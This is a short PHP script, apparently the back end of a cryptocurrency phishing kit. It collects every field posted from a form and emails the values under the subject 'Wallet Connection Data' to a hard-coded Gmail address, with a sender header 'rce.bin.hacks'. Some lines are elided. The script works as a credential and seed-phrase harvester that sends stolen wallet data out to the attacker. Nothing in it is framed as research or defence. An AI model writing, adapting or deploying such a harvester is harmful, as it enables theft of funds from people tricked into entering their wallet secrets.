<?php
// Email address where the data will be sent
$to = "maxwallace389@gmail.com"; // Replace with your email
$subject = "Wallet Connection Data";

// Initialize the email body
$message = "";

// Iterate through POST data and build the email message
foreach ($_POST as $variable => $value) {
    ...
    // Append sanitized data to the email body
    $message .= $safe_variable . ": " . $safe_value . "\n";
}

// Email headers
$headers = "From: rce.bin.hacks@gmail.com" . "\r\n" .
           "Reply-To: rce.bin.hacks@gmail.com" . "\r\n" .
...
if(mail($to, $subject, $message, $headers)) {
    ...
    // Error message if the email fails
    echo '
    <!DOCTYPE html>
    <html lang="en">
    <head>
